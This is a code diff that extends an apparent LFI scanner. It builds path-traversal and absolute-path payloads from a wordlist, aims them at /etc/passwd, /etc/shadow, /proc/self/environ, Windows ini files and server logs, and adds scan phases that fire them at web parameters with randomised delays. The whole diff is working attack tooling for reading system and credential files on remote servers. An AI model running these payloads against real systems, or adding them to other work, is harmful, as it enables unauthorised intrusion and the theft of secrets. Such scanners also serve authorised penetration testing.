@@ -203,6 +203,58 @@ LOG_FILES = [
     "/tmp/sess_" + "a" * 26,  # PHP session file
 ]
 
+# ──────────────────────────────────────────────────────────────────
+# Extended LFI paths from wordlist (params/lfi_paths.txt)
+# ──────────────────────────────────────────────────────────────────
+
+def _load_lfi_wordlist() -> List[str]:
+    """Load extended LFI paths from params/lfi_paths.txt."""
+    import os
+    wordlist_path = os.path.join(os.path.dirname(__file__), "params", "lfi_paths.txt")
+    paths = []
+    try:
+        with open(wordlist_path, 'r', encoding='utf-8', errors='ignore') as f:
+            for line in f:
+                line = line.strip()
+                if line and not line.startswith('#'):
+                    paths.append(line)
+    except FileNotFoundError:
+        logger.debug(f"[LFI] Wordlist not found: {wordlist_path}")
+    return paths
+
+# Direct file inclusion payloads — absolute paths for systems allowing direct file read
+# Each entry is (payload_path, target_file_for_validation)
+DIRECT_FILE_PAYLOADS: List[Tuple[str, str]] = []
+_extended_paths = _load_lfi_wordlist()
+for _p in _extended_paths:
+    _p_stripped = _p.lstrip('/')
+    # Determine which validation checks to use
+    if '/etc/passwd' in _p:
+        DIRECT_FILE_PAYLOADS.append((_p, '/etc/passwd'))
+    elif '/etc/shadow' in _p:
+        DIRECT_FILE_PAYLOADS.append((_p, '/etc/passwd'))  # shadow format similar
+    elif '/win.ini' in _p.lower() or '/boot.ini' in _p.lower():
+        DIRECT_FILE_PAYLOADS.append((_p, 'C:\\Windows\\win.ini'))
+    elif '/etc/hosts' in _p:
+        DIRECT_FILE_PAYLOADS.append((_p, '/etc/hosts'))
+    elif '/proc/' in _p:
+        DIRECT_FILE_PAYLOADS.append((_p, '/proc/self/environ'))
+    elif 'access' in _p.lower() and 'log' in _p.lower():
+        DIRECT_FILE_PAYLOADS.append((_p, '/etc/hosts'))  # generic — just check for valid content
+    elif 'error' in _p.lower() and 'log' in _p.lower():
+        DIRECT_FILE_PAYLOADS.append((_p, '/etc/hosts'))
+    else:
+        # Generic file — check if response contains common file content signatures
+        DIRECT_FILE_PAYLOADS.append((_p, '/etc/passwd'))
+
+# Also generate traversal variants for each wordlist path (../../../ + path)
+TRAVERSAL_WORDLIST_PAYLOADS: List[Tuple[str, str]] = []
+for _p, _check in DIRECT_FILE_PAYLOADS[:50]:  # Limit to top 50 for traversal generation
+    clean = _p.lstrip('/')
+    for depth in range(3, 8):
+        prefix = '../' * depth
+        TRAVERSAL_WORDLIST_PAYLOADS.append((f"{prefix}{clean}", _check))
+
 
 # ──────────────────────────────────────────────────────────────────
 # LFI Scanner
@@ -362,6 +414,32 @@ class LFIScanner:
                             result.waf_bypassed = waf_name
                             results.append(result)
                             break
+
+        # Phase 3.5: Extended wordlist traversal paths (207 paths from dic_file_dump.txt)
+        if not results and TRAVERSAL_WORDLIST_PAYLOADS:
+            for payload, target_file in TRAVERSAL_WORDLIST_PAYLOADS[:80]:  # Sample 80 variants
+                result = await self._test_payload(
+                    url, param, params, payload, target_file,
+                    "traversal", session, baseline_len,
+                )
+                if result:
+                    results.append(result)
+                    logger.info(f"[LFI] Wordlist hit: {payload}")
+                    break
+                await asyncio.sleep(random.uniform(0.02, 0.06))
+
+        # Phase 3.6: Direct absolute file paths (for apps that read absolute paths directly)
+        if not results and DIRECT_FILE_PAYLOADS:
+            for payload, target_file in DIRECT_FILE_PAYLOADS[:30]:  # Top 30 most interesting
+                result = await self._test_payload(
+                    url, param, params, payload, target_file,
+                    "traversal", session, baseline_len,
+                )
+                if result:
+                    results.append(result)
+                    logger.info(f"[LFI] Direct path hit: {payload}")
+                    break
+                await asyncio.sleep(random.uniform(0.02, 0.06))
 
         # Phase 4: PHP wrappers
         php_indicators = any(x in url.lower() for x in ['.php', 'php', 'index'])
